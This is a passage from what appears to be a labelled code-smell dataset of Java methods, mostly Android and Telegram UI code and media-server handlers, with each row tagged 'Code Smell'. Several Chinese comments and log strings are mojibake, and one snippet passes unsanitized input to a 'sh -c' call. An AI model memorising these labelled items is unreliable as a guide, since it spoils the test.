      while (i < elements.length && (i < otherTuple.index)) {
        double value=get(i);
        score+=value * value;
        i++;
      }
      if (i == otherTuple.index) {
        double tmp=get(i) - otherTuple.value;
        score+=tmp * tmp;
        i++;
      }
    }
    for (; i < elements.length; i++) {
      double value=get(i);
      score+=value * value;
    }
    return Math.sqrt(score);
  }
 else {
    throw new IllegalArgumentException(""Unknown vector subclass "" + other.getClass().getCanonicalName() + "" for input"");
  }
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent ev){
  if (ev.getAction() == MotionEvent.ACTION_DOWN && ev.getEdgeFlags() != 0) {
    return false;
  }
  if (mVelocityTracker == null) {
    mVelocityTracker=VelocityTracker.obtain();
  }
  mVelocityTracker.addMovement(ev);
  final int action=ev.getAction();
switch (action & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_DOWN:
{
      final float x=ev.getX();
      final float y=ev.getY();
      if (!(mIsBeingDragged=inChild((int)x,(int)y))) {
        return false;
      }
      if (!mScroller.isFinished()) {
        mScroller.abortAnimation();
      }
      mLastMotionY=y;
      mLastMotionX=x;
      mActivePointerId=ev.getPointerId(0);
      break;
    }
case MotionEvent.ACTION_MOVE:
  if (mIsBeingDragged) {
    final int activePointerIndex=ev.findPointerIndex(mActivePointerId);
    final float y=ev.getY(activePointerIndex);
    final int deltaY=(int)(mLastMotionY - y);
    mLastMotionY=y;
    final float x=ev.getX(activePointerIndex);
    final int deltaX=(int)(mLastMotionX - x);
    mLastMotionX=x;
    scrollBy(deltaX,deltaY);
  }
break;
case MotionEvent.ACTION_UP:
if (mIsBeingDragged) {
if (mFlingEnabled) {
  final VelocityTracker velocityTracker=mVelocityTracker;
  velocityTracker.computeCurrentVelocity(1000,mMaximumVelocity);
  int initialVelocitx=(int)velocityTracker.getXVelocity();
  int initialVelocity=(int)velocityTracker.getYVelocity();
  if (getChildCount() > 0) {
    if (Math.abs(initialVelocitx) > initialVelocitx || Math.abs(initialVelocity) > mMinimumVelocity) {
      fling(-initialVelocitx,-initialVelocity);
    }
  }
}
mActivePointerId=INVALID_POINTER;
mIsBeingDragged=false;
if (mVelocityTracker != null) {
  mVelocityTracker.recycle();
  mVelocityTracker=null;
}
}
break;
case MotionEvent.ACTION_CANCEL:
if (mIsBeingDragged && getChildCount() > 0) {
mActivePointerId=INVALID_POINTER;
mIsBeingDragged=false;
if (mVelocityTracker != null) {
mVelocityTracker.recycle();
mVelocityTracker=null;
}
}
break;
case MotionEvent.ACTION_POINTER_UP:
onSecondaryPointerUp(ev);
break;
}
return true;
}",1,Code Smell
"/** 
 * 鍚堝苟妯℃澘銆�
 * @param templates          鍘熸ā鏉挎暟缁勶紝鍏佽涓簕@code null}
 * @param resourceName
 * @param resourceIsTemplate
 * @return
 */
protected String[] mergeTemplates(String[] templates,String resourceName,boolean resourceIsTemplate){
  return mergeTemplates(templates,new String[]{resourceName},new boolean[]{resourceIsTemplate});
}
/** 
 * 鍚堝苟妯℃澘銆�
 * @param templates           鍘熸ā鏉挎暟缁勶紝鍏佽涓簕@code null}
 * @param resourceNames
 * @param resourceIsTemplates
 * @return
 */
protected String[] mergeTemplates(String[] templates,String[] resourceNames,boolean[] resourceIsTemplates){
  List<String> ts=new ArrayList<>();
  if (templates != null)   ts.addAll(Arrays.asList(templates));
  boolean autoFirstTemplate=ts.isEmpty();
  for (int i=0; i < resourceNames.length; i++) {
    boolean contains=ts.contains(resourceNames[i]);
    if (resourceIsTemplates[i] && !contains)     ts.add(resourceNames[i]);
 else     if (!resourceIsTemplates[i] && contains)     ts.remove(resourceNames[i]);
  }
  if (autoFirstTemplate) {
    int firstTempalteIdx=-1;
    for (int i=0; i < ts.size(); i++) {
      String tn=ts.get(i);
      if (tn.equalsIgnoreCase(""index.html"") || tn.equalsIgnoreCase(""index.htm"")) {
        firstTempalteIdx=i;
        break;
      }
    }
    if (firstTempalteIdx > 0) {
      String tn=ts.remove(firstTempalteIdx);
      ts.add(0,tn);
    }
  }
  return ts.toArray(new String[ts.size()]);
}",1,Code Smell
"public String getMessageNameString(){
  if (message == null) {
    return null;
  }
  TLRPC.User user;
  TLRPC.User fromUser=null;
  TLRPC.Chat fromChat=null;
  long fromId=message.getFromChatId();
  final long selfId=UserConfig.getInstance(currentAccount).getClientUserId();
  if (!isSavedDialog && currentDialogId == selfId) {
    long savedDialogId=message.getSavedDialogId();
    if (savedDialogId == selfId) {
      return null;
    }
 else     if (savedDialogId != UserObject.ANONYMOUS) {
      if (message.messageOwner != null && message.messageOwner.fwd_from != null) {
        long fwdId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.saved_from_id);
        if (fwdId == 0) {
          fwdId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.from_id);
        }
        if (fwdId > 0 && fwdId != savedDialogId) {
          return null;
        }
      }
      fromId=savedDialogId;
    }
  }
  if (isSavedDialog && message.messageOwner != null && message.messageOwner.fwd_from != null) {
    fromId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.saved_from_id);
    if (fromId == 0) {
      fromId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.from_id);
    }
  }
  if (DialogObject.isUserDialog(fromId)) {
    fromUser=MessagesController.getInstance(currentAccount).getUser(fromId);
  }
 else {
    fromChat=MessagesController.getInstance(currentAccount).getChat(-fromId);
  }
  if (currentDialogId == selfId) {
    if (fromUser != null) {
      return UserObject.getFirstName(fromUser).replace(""\n"","""");
    }
 else     if (fromChat != null) {
      return fromChat.title.replace(""\n"","""");
    }
    return null;
  }
 else   if (message.isOutOwner()) {
    return LocaleController.getString(""FromYou"",R.string.FromYou);
  }
 else   if (!isSavedDialog && message != null && message.messageOwner != null && message.messageOwner.from_id instanceof TLRPC.TL_peerUser && (user=MessagesController.getInstance(currentAccount).getUser(message.messageOwner.from_id.user_id)) != null) {
    return UserObject.getFirstName(user).replace(""\n"","""");
  }
 else   if (fromUser != null) {
    if (useForceThreeLines || SharedConfig.useThreeLinesLayout) {
      if (UserObject.isDeleted(fromUser)) {
        return LocaleController.getString(""HiddenName"",R.string.HiddenName);
      }
 else {
        return ContactsController.formatName(fromUser.first_name,fromUser.last_name).replace(""\n"","""");
      }
    }
 else {
      return UserObject.getFirstName(fromUser).replace(""\n"","""");
    }
  }
 else   if (fromChat != null && fromChat.title != null) {
    return fromChat.title.replace(""\n"","""");
  }
 else {
    return LocaleController.getString(""HiddenName"",R.string.HiddenName);
  }
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent ev){
  if (disableScrolling) {
    return false;
  }
  if (profileActivity.getParentLayout() != null && !profileActivity.getParentLayout().checkTransitionAnimation() && !checkTabsAnimationInProgress() && !isInPinchToZoomTouchMode) {
    if (ev != null) {
      if (velocityTracker == null) {
        velocityTracker=VelocityTracker.obtain();
      }
      velocityTracker.addMovement(ev);
      if (fwdRestrictedHint != null) {
        fwdRestrictedHint.hide();
      }
    }
    if (ev != null && ev.getAction() == MotionEvent.ACTION_DOWN && !startedTracking && !maybeStartTracking && ev.getY() >= dp(48)) {
      startedTrackingPointerId=ev.getPointerId(0);
      maybeStartTracking=true;
      startedTrackingX=(int)ev.getX();
      startedTrackingY=(int)ev.getY();
      velocityTracker.clear();
    }
 else     if (ev != null && ev.getAction() == MotionEvent.ACTION_MOVE && ev.getPointerId(0) == startedTrackingPointerId) {
      int dx=(int)(ev.getX() - startedTrackingX);
      int dy=Math.abs((int)ev.getY() - startedTrackingY);
      if (startedTracking && (animatingForward && dx > 0 || !animatingForward && dx < 0)) {
        if (!prepareForMoving(ev,dx < 0)) {
          maybeStartTracking=true;
          startedTracking=false;
          onTabScroll(false);
          mediaPages[0].setTranslationX(0);
          mediaPages[1].setTranslationX(animatingForward ? mediaPages[0].getMeasuredWidth() : -mediaPages[0].getMeasuredWidth());
          scrollSlidingTextTabStrip.selectTabWithId(mediaPages[1].selectedType,0);
          onTabProgress(getTabProgress());
        }
      }
      if (maybeStartTracking && !startedTracking) {
        float touchSlop=AndroidUtilities.getPixelsInCM(0.3f,true);
        if (Math.abs(dx) >= touchSlop && Math.abs(dx) > dy) {
          prepareForMoving(ev,dx < 0);
        }
      }
 else       if (startedTracking) {
        mediaPages[0].setTranslationX(dx);
        if (animatingForward) {
          mediaPages[1].setTranslationX(mediaPages[0].getMeasuredWidth() + dx);
        }
 else {
          mediaPages[1].setTranslationX(dx - mediaPages[0].getMeasuredWidth());
        }
        float scrollProgress=Math.abs(dx) / (float)mediaPages[0].getMeasuredWidth();
        if (!canShowSearchItem()) {
          searchAlpha=0;
        }
 else {
          searchAlpha=getSearchAlpha(scrollProgress);
          updateSearchItemIcon(scrollProgress);
          optionsAlpha=getPhotoVideoOptionsAlpha(scrollProgress);
          photoVideoOptionsItem.setVisibility((optionsAlpha == 0 || !canShowSearchItem() || isArchivedOnlyStoriesView()) ? INVISIBLE : View.VISIBLE);
        }
        updateOptionsSearch();
        scrollSlidingTextTabStrip.selectTabWithId(mediaPages[1].selectedType,scrollProgress);
        onTabProgress(getTabProgress());
        onSelectedTabChanged();
      }
    }
 else     if (ev == null || ev.getPointerId(0) == startedTrackingPointerId && (ev.getAction() == MotionEvent.ACTION_CANCEL || ev.getAction() == MotionEvent.ACTION_UP || ev.getAction() == MotionEvent.ACTION_POINTER_UP)) {
      stopScroll(ev);
    }
    return startedTracking;
  }
  return false;
}",1,Code Smell
"/** 
 * Get producer by topic name: i. if the topic is judged to be an illegal topic, return null; ii. if it is not an illegal topic or the status has expired, check: a. if the topic has been published before, return the corresponding producer directly; b. if the topic is not in the published list, perform the topic's publish action. If the topic is thrown exception during the publishing process, set the topic to an illegal topic
 * @param topicName  the topic name
 * @return  the producerif topic is illegal, return null
 * @throws TubeClientException
 */
public MessageProducer getProducer(String topicName) throws TubeClientException {
  AtomicLong fbdTime=FROZEN_TOPIC_MAP.get(topicName);
  if (fbdTime != null && fbdTime.get() > System.currentTimeMillis()) {
    return null;
  }
  MessageProducer tmpProducer=producerMap.get(topicName);
  if (tmpProducer != null) {
    if (fbdTime != null) {
      FROZEN_TOPIC_MAP.remove(topicName);
    }
    return tmpProducer;
  }
synchronized (lastPubTopicCnt) {
    fbdTime=FROZEN_TOPIC_MAP.get(topicName);
    if (fbdTime != null && fbdTime.get() > System.currentTimeMillis()) {
      return null;
    }
    if (lastProducer == null || lastPubTopicCnt.get() >= clusterConfig.getMaxTopicsEachProducerHold()) {
      lastProducer=sessionFactory.createProducer();
      lastPubTopicCnt.set(0);
    }
    try {
      lastProducer.publish(topicName);
    }
 catch (    Throwable e) {
      fbdTime=FROZEN_TOPIC_MAP.get(topicName);
      if (fbdTime == null) {
        AtomicLong tmpFbdTime=new AtomicLong();
        fbdTime=FROZEN_TOPIC_MAP.putIfAbsent(topicName,tmpFbdTime);
        if (fbdTime == null) {
          fbdTime=tmpFbdTime;
        }
      }
      fbdTime.set(System.currentTimeMillis() + PUBLISH_FAILURE_WAIT);
      logger.warn(""Throw exception while publish topic="" + topicName + "", exception is ""+ e.getMessage());
      return null;
    }
    producerMap.put(topicName,lastProducer);
    lastPubTopicCnt.incrementAndGet();
    return lastProducer;
  }
}",1,Code Smell
"public static boolean testWriteNumberValueToTime(Class propertyType,Bb bb){
  if (propertyType == LocalDateTime.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        LocalDateTime time=Instant.ofEpochMilli(toLongValue(v)).atZone(ZoneId.systemDefault()).toLocalDateTime();
        bb.setValue(time);
      }
    }
    return true;
  }
 else   if (propertyType == Date.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        bb.setValue(new Date(toLongValue(v)));
      }
    }
    return true;
  }
 else   if (propertyType == Timestamp.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        bb.setValue(new Timestamp(toLongValue(v)));
      }
    }
    return true;
  }
 else   if (propertyType == LocalDate.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        LocalDate date=Instant.ofEpochMilli(toLongValue(v)).atZone(ZoneId.systemDefault()).toLocalDate();
        bb.setValue(date);
      }
    }
    return true;
  }
  return false;
}",1,Code Smell
"private static Object[] buildArgs(Method method){
  ArrayList<Object> result=new ArrayList<>();
  for (  Class<?> c : method.getParameterTypes()) {
    if (c == int.class) {
      result.add(0);
    }
 else     if (c == long.class) {
      result.add(0L);
    }
 else     if (c == float.class) {
      result.add(0f);
    }
 else     if (c == double.class) {
      result.add(0d);
    }
 else     if (c == char.class) {
      result.add((char)0);
    }
 else     if (c == byte.class) {
      result.add((byte)0);
    }
 else     if (c == Uri.class) {
      result.add(Uri.fromParts(""example"",""example"",null));
    }
 else     if (c == ContentValues.class) {
      result.add(new ContentValues());
    }
 else     if (c == ArrayList.class) {
      result.add(new ArrayList<>());
    }
 else     if (BuildUtils.atLeast31() && c == AttributionSource.class) {
      result.add(new AttributionSource.Builder(0).setPackageName(""example"").setAttributionTag(""example"").build());
    }
 else {
      result.add(null);
    }
  }
  return result.toArray();
}",1,Code Smell
"@Override public void handForDevice(RequestEvent evt,Device device,Element element){
  if (device == null) {
    return;
  }
  SIPRequest request=(SIPRequest)evt.getRequest();
  logger.info(""[鏀跺埌蹇冭烦] device: {}, callId: {}"",device.getDeviceId(),request.getCallIdHeader().getCallId());
  try {
    responseAck(request,Response.OK);
  }
 catch (  SipException|InvalidArgumentException|ParseException e) {
    logger.error(""[鍛戒护鍙戦佸け璐 蹇冭烦鍥炲: {}"",e.getMessage());
  }
  if (!ObjectUtils.isEmpty(device.getKeepaliveTime()) && DateUtil.getDifferenceForNow(device.getKeepaliveTime()) <= 3000L) {
    logger.info(""[鏀跺埌蹇冭烦] 蹇冭烦鍙戦佽繃浜庨绻侊紝宸插拷鐣 device: {}, callId: {}"",device.getDeviceId(),request.getCallIdHeader().getCallId());
    return;
  }
  RemoteAddressInfo remoteAddressInfo=SipUtils.getRemoteAddressFromRequest(request,userSetting.getSipUseSourceIpAsRemoteAddress());
  if (!device.getIp().equalsIgnoreCase(remoteAddressInfo.getIp()) || device.getPort() != remoteAddressInfo.getPort()) {
    logger.info(""[鏀跺埌蹇冭烦] 璁惧{}鍦板潃鍙樺寲, 杩滅▼鍦板潃涓: {}:{}"",device.getDeviceId(),remoteAddressInfo.getIp(),remoteAddressInfo.getPort());
    device.setPort(remoteAddressInfo.getPort());
    device.setHostAddress(remoteAddressInfo.getIp().concat("":"").concat(String.valueOf(remoteAddressInfo.getPort())));
    device.setIp(remoteAddressInfo.getIp());
    if (device.getSubscribeCycleForCatalog() > 0) {
      deviceService.removeCatalogSubscribe(device,result -> {
        deviceService.addCatalogSubscribe(device);
      }
);
    }
  }
  if (device.getKeepaliveTime() == null) {
    device.setKeepaliveIntervalTime(60);
  }
 else {
    long lastTime=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(device.getKeepaliveTime());
    if (System.currentTimeMillis() / 1000 - lastTime > 10) {
      device.setKeepaliveIntervalTime(Long.valueOf(System.currentTimeMillis() / 1000 - lastTime).intValue());
    }
  }
  device.setKeepaliveTime(DateUtil.getNow());
  if (device.isOnLine()) {
    deviceService.updateDevice(device);
  }
 else {
    if (!deviceService.expire(device)) {
      device.setOnLine(false);
      deviceService.online(device,null);
    }
  }
  String registerExpireTaskKey=VideoManagerConstants.REGISTER_EXPIRE_TASK_KEY_PREFIX + device.getDeviceId();
  dynamicTask.startDelay(registerExpireTaskKey,() -> deviceService.offline(device.getDeviceId(),""涓夋蹇冭烦澶辫触""),device.getKeepaliveIntervalTime() * 1000 * 3);
}",1,Code Smell
"static List<QueryWrapper> getChildQueryWrapper(QueryCondition condition){
  List<QueryWrapper> list=null;
  while (condition != null) {
    if (condition.checkEffective()) {
      if (condition instanceof Brackets) {
        List<QueryWrapper> childQueryWrapper=getChildQueryWrapper(((Brackets)condition).getChildCondition());
        if (!childQueryWrapper.isEmpty()) {
          if (list == null) {
            list=new ArrayList<>();
          }
          list.addAll(childQueryWrapper);
        }
      }
 else {
        Object value=condition.getValue();
        if (value instanceof QueryWrapper) {
          if (list == null) {
            list=new ArrayList<>();
          }
          list.add((QueryWrapper)value);
          list.addAll(((QueryWrapper)value).getChildSelect());
        }
 else         if (value != null && value.getClass().isArray()) {
          for (int i=0; i < Array.getLength(value); i++) {
            Object arrayValue=Array.get(value,i);
            if (arrayValue instanceof QueryWrapper) {
              if (list == null) {
                list=new ArrayList<>();
              }
              list.add((QueryWrapper)arrayValue);
              list.addAll(((QueryWrapper)arrayValue).getChildSelect());
            }
          }
        }
      }
    }
    condition=condition.next;
  }
  return list == null ? Collections.emptyList() : list;
}",1,Code Smell
"private List<InputStream> setRequestFormParameter(SpiderNode node,HttpRequest request,List<Map<String,String>> parameters,SpiderContext context,Map<String,Object> variables){
  List<InputStream> streams=new ArrayList<>();
  if (parameters != null) {
    for (    Map<String,String> nameValue : parameters) {
      Object value;
      String parameterName=nameValue.get(PARAMETER_FORM_NAME);
      if (StringUtils.isNotBlank(parameterName)) {
        String parameterValue=nameValue.get(PARAMETER_FORM_VALUE);
        String parameterType=nameValue.get(PARAMETER_FORM_TYPE);
        String parameterFilename=nameValue.get(PARAMETER_FORM_FILENAME);
        boolean hasFile=""file"".equals(parameterType);
        try {
          value=ExpressionUtils.execute(parameterValue,variables);
          if (hasFile) {
            InputStream stream=null;
            if (value instanceof byte[]) {
              stream=new ByteArrayInputStream((byte[])value);
            }
 else             if (value instanceof String) {
              stream=new ByteArrayInputStream(((String)value).getBytes());
            }
 else             if (value instanceof InputStream) {
              stream=(InputStream)value;
            }
            if (stream != null) {
              streams.add(stream);
              request.data(parameterName,parameterFilename,stream);
              context.pause(node.getNodeId(),""request-body"",parameterName,parameterFilename);
              logger.info(""璁剧疆璇锋眰鍙傛暟锛歿}={}"",parameterName,parameterFilename);
            }
 else {
              logger.warn(""璁剧疆璇锋眰鍙傛暟锛歿}澶辫触锛屾棤浜岃繘鍒跺唴瀹"",parameterName);
            }
          }
 else {
            request.data(parameterName,value);
            context.pause(node.getNodeId(),""request-body"",parameterName,value);
            logger.info(""璁剧疆璇锋眰鍙傛暟锛歿}={}"",parameterName,value);
          }
        }
 catch (        Exception e) {
          logger.error(""璁剧疆璇锋眰鍙傛暟锛歿}鍑洪敊,寮傚父淇℃伅:{}"",parameterName,e);
        }
      }
    }
  }
  return streams;
}
",1,Code Smell
"private void processBitmap(Bitmap bitmap,MessageObject avatarObject){
  if (bitmap == null) {
    return;
  }
  uploadedVideo=null;
  uploadedPhoto=null;
  convertingVideo=null;
  videoPath=null;
  vectorMarkup=avatarObject == null ? null : avatarObject.emojiMarkup;
  bigPhoto=ImageLoader.scaleAndSaveImage(bitmap,800,800,80,false,320,320);
  smallPhoto=ImageLoader.scaleAndSaveImage(bitmap,150,150,80,false,150,150);
  if (smallPhoto != null) {
    try {
      Bitmap b=BitmapFactory.decodeFile(FileLoader.getInstance(currentAccount).getPathToAttach(smallPhoto,true).getAbsolutePath());
      String key=smallPhoto.location.volume_id + ""_"" + smallPhoto.location.local_id+ ""@50_50"";
      ImageLoader.getInstance().putImageToCache(new BitmapDrawable(b),key,true);
    }
 catch (    Throwable ignore) {
    }
  }
  bitmap.recycle();
  if (bigPhoto != null) {
    UserConfig.getInstance(currentAccount).saveConfig(false);
    uploadingImage=FileLoader.getDirectory(FileLoader.MEDIA_DIR_CACHE) + ""/"" + bigPhoto.location.volume_id+ ""_""+ bigPhoto.location.local_id+ "".jpg"";
    if (uploadAfterSelect) {
      if (avatarObject != null && avatarObject.videoEditedInfo != null) {
        if (supportEmojiMarkup && !MessagesController.getInstance(currentAccount).uploadMarkupVideo) {
          if (delegate != null) {
            delegate.didStartUpload(true);
          }
          if (delegate != null) {
            delegate.didUploadPhoto(null,null,0,null,bigPhoto,smallPhoto,isVideo,null);
            delegate.didUploadPhoto(null,null,videoTimestamp,videoPath,bigPhoto,smallPhoto,isVideo,vectorMarkup);
            cleanup();
          }
          return;
        }
        convertingVideo=avatarObject;
        long startTime=avatarObject.videoEditedInfo.startTime < 0 ? 0 : avatarObject.videoEditedInfo.startTime;
        videoTimestamp=(avatarObject.videoEditedInfo.avatarStartTime - startTime) / 1000000.0;
        avatarObject.videoEditedInfo.shouldLimitFps=false;
        NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.filePreparingStarted);
        NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.filePreparingFailed);
        NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileNewChunkAvailable);
        MediaController.getInstance().scheduleVideoConvert(avatarObject,true,true);
        uploadingImage=null;
        if (delegate != null) {
          delegate.didStartUpload(true);
        }
        isVideo=true;
      }
 else {
        if (delegate != null) {
          delegate.didStartUpload(false);
        }
        isVideo=false;
      }
      NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileUploaded);
      NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileUploadProgressChanged);
      NotificationCenter.getInstance(currentAccount).addObserver(ImageUpdater.this,NotificationCenter.fileUploadFailed);
      if (uploadingImage != null) {
        FileLoader.getInstance(currentAccount).uploadFile(uploadingImage,false,true,ConnectionsManager.FileTypePhoto);
      }
    }
    if (delegate != null) {
      delegate.didUploadPhoto(null,null,0,null,bigPhoto,smallPhoto,isVideo,null);
    }
  }
}",1,Code Smell
"public void setAudioOutput(int which){
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""setAudioOutput "" + which);
  }
  AudioManager am=(AudioManager)getSystemService(AUDIO_SERVICE);
  if (USE_CONNECTION_SERVICE && systemCallConnection != null) {
switch (which) {
case 2:
      systemCallConnection.setAudioRoute(CallAudioState.ROUTE_BLUETOOTH);
    break;
case 1:
  systemCallConnection.setAudioRoute(CallAudioState.ROUTE_WIRED_OR_EARPIECE);
break;
case 0:
systemCallConnection.setAudioRoute(CallAudioState.ROUTE_SPEAKER);
break;
}
}
 else if (audioConfigured && !USE_CONNECTION_SERVICE) {
switch (which) {
case 2:
if (!bluetoothScoActive) {
needSwitchToBluetoothAfterScoActivates=true;
try {
am.startBluetoothSco();
}
 catch (Throwable e) {
FileLog.e(e);
}
}
 else {
am.setBluetoothScoOn(true);
am.setSpeakerphoneOn(false);
}
audioRouteToSet=AUDIO_ROUTE_BLUETOOTH;
break;
case 1:
needSwitchToBluetoothAfterScoActivates=false;
if (bluetoothScoActive || bluetoothScoConnecting) {
am.stopBluetoothSco();
bluetoothScoActive=false;
bluetoothScoConnecting=false;
}
am.setSpeakerphoneOn(false);
am.setBluetoothScoOn(false);
audioRouteToSet=AUDIO_ROUTE_EARPIECE;
break;
case 0:
needSwitchToBluetoothAfterScoActivates=false;
if (bluetoothScoActive || bluetoothScoConnecting) {
am.stopBluetoothSco();
bluetoothScoActive=false;
bluetoothScoConnecting=false;
}
am.setBluetoothScoOn(false);
am.setSpeakerphoneOn(true);
audioRouteToSet=AUDIO_ROUTE_SPEAKER;
break;
}
updateOutputGainControlState();
}
 else {
switch (which) {
case 2:
audioRouteToSet=AUDIO_ROUTE_BLUETOOTH;
speakerphoneStateToSet=false;
break;
case 1:
audioRouteToSet=AUDIO_ROUTE_EARPIECE;
speakerphoneStateToSet=false;
break;
case 0:
audioRouteToSet=AUDIO_ROUTE_SPEAKER;
speakerphoneStateToSet=true;
break;
}
}
for (StateListener l : stateListeners) {
l.onAudioSettingsChanged();
}
}",1,Code Smell
"public static void startPerfmon(String udId,String bundleId,Session session,LogUtil logUtil,int interval){
  stopPerfmon(udId);
  Process ps=null;
  String commandLine=""%s perfmon -r %d --sys-cpu --sys-mem --sys-disk --sys-network --fps --gpu -u %s%s "";
  String system=System.getProperty(""os.name"").toLowerCase();
  String tail=bundleId.length() == 0 ? """" : ("" --proc-cpu --proc-mem -b "" + bundleId);
  try {
    if (system.contains(""win"")) {
      ps=Runtime.getRuntime().exec(new String[]{""cmd"",""/c"",String.format(commandLine,sib,interval,udId,tail)});
    }
 else     if (system.contains(""linux"") || system.contains(""mac"")) {
      ps=Runtime.getRuntime().exec(new String[]{""sh"",""-c"",String.format(commandLine,sib,interval,udId,tail)});
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  InputStreamReader inputStreamReader=new InputStreamReader(ps.getInputStream());
  BufferedReader stdInput=new BufferedReader(inputStreamReader);
  InputStreamReader err=new InputStreamReader(ps.getErrorStream());
  BufferedReader stdInputErr=new BufferedReader(err);
  Thread psErr=new Thread(() -> {
    String s;
    while (true) {
      try {
        if ((s=stdInputErr.readLine()) == null)         break;
      }
 catch (      IOException e) {
        logger.info(e.getMessage());
        break;
      }
      logger.info(s);
    }
    try {
      stdInputErr.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    try {
      err.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    logger.info(""perfmon print thread shutdown."");
  }
);
  psErr.start();
  Thread pro=new Thread(() -> {
    String s;
    while (true) {
      try {
        if ((s=stdInput.readLine()) == null)         break;
      }
 catch (      IOException e) {
        logger.info(e.getMessage());
        break;
      }
      try {
        JSONObject perf=JSON.parseObject(s);
        if (session != null) {
          JSONObject perfDetail=new JSONObject();
          perfDetail.put(""msg"",""perfDetail"");
          perfDetail.put(""detail"",perf);
          sendText(session,perfDetail.toJSONString());
        }
        if (logUtil != null) {
          logUtil.sendPerLog(perf.toJSONString());
        }
      }
 catch (      Exception e) {
      }
    }
    try {
      stdInput.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    try {
      inputStreamReader.close();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    logger.info(""perfmon print thread shutdown."");
  }
);
  pro.start();
  String processName=String.format(""process-%s-perfmon"",udId);
  GlobalProcessMap.getMap().put(processName,ps);
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet sdiv(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(bits,taintRes);
  for (  AbsVal op1 : kSet) {
    for (    AbsVal op2 : rhs.kSet) {
      if (op2.isZero()) {
        continue;
      }
      RegionBase region=getRegionDivRem(op1,op2);
      if (region != null) {
        if (res.kSet.size() == GlobalState.config.getK()) {
          return getTop(taintRes);
        }
        if (bits <= 64) {
          assert (op1.bigVal == null && op2.bigVal == null);
          res.kSet=res.kSet.insert(new AbsVal(region,(AbsVal.signExtendToLong(op1.value,bits) / AbsVal.signExtendToLong(op2.value,bits)) & getMask(bits)));
        }
 else {
          BigInteger bigOp1=op1.toBigInteger(bits,true);
          BigInteger bigOp2=op2.toBigInteger(bits,true);
          BigInteger tmp=AbsVal.toUnsigned(bigOp1.divide(bigOp2).and(getBigMask(bits)),bits);
          res.kSet=res.kSet.insert(new AbsVal(region,tmp));
        }
      }
    }
  }
  return res;
}",1,Code Smell
"public JSONObject sendGet(MediaServer mediaServerItem,String api,Map<String,Object> param,RequestCallback callback){
  OkHttpClient client=getClient();
  if (mediaServerItem == null) {
    return null;
  }
  if (mediaServerItem.getRecordAssistPort() <= 0) {
    logger.warn(""鏈惎鐢ˋssist鏈嶅姟"");
    return null;
  }
  StringBuilder stringBuffer=new StringBuilder();
  stringBuffer.append(api);
  JSONObject responseJSON=null;
  if (param != null && !param.keySet().isEmpty()) {
    stringBuffer.append(""?"");
    int index=1;
    for (    String key : param.keySet()) {
      if (param.get(key) != null) {
        stringBuffer.append(key + ""="" + param.get(key));
        if (index < param.size()) {
          stringBuffer.append(""&"");
        }
      }
      index++;
    }
  }
  String url=stringBuffer.toString();
  logger.info(""[璁块棶assist]锛 {}"",url);
  Request request=new Request.Builder().get().url(url).build();
  if (callback == null) {
    try {
      Response response=client.newCall(request).execute();
      if (response.isSuccessful()) {
        ResponseBody responseBody=response.body();
        if (responseBody != null) {
          String responseStr=responseBody.string();
          responseJSON=JSON.parseObject(responseStr);
        }
      }
 else {
        response.close();
        Objects.requireNonNull(response.body()).close();
      }
    }
 catch (    ConnectException e) {
      logger.error(String.format(""杩炴帴Assist澶辫触: %s, %s"",e.getCause().getMessage(),e.getMessage()));
      logger.info(""璇锋鏌edia閰嶇疆骞剁‘璁ssist宸插惎鍔..."");
    }
catch (    IOException e) {
      logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s"",url,e.getMessage()));
    }
  }
 else {
    client.newCall(request).enqueue(new Callback(){
      @Override public void onResponse(      @NotNull Call call,      @NotNull Response response){
        if (response.isSuccessful()) {
          try {
            String responseStr=Objects.requireNonNull(response.body()).string();
            callback.run(JSON.parseObject(responseStr));
          }
 catch (          IOException e) {
            logger.error(String.format(""[ %s ]璇锋眰澶辫触: %s"",url,e.getMessage()));
          }
        }
 else {
          response.close();
          Objects.requireNonNull(response.body()).close();
        }
      }
      @Override public void onFailure(      @NotNull Call call,      @NotNull IOException e){
        logger.error(String.format(""杩炴帴Assist澶辫触: %s, %s"",e.getCause().getMessage(),e.getMessage()));
        logger.info(""璇锋鏌edia閰嶇疆骞剁‘璁ssist宸插惎鍔..."");
      }
    }
);
  }
  return responseJSON;
}",1,Code Smell
"public static int merge(long[] arr,int L,int M,int R,int lower,int upper){
  int ans=0;
  int windowL=L;
  int windowR=L;
  for (int i=M + 1; i <= R; i++) {
    long min=arr[i] - upper;
    long max=arr[i] - lower;
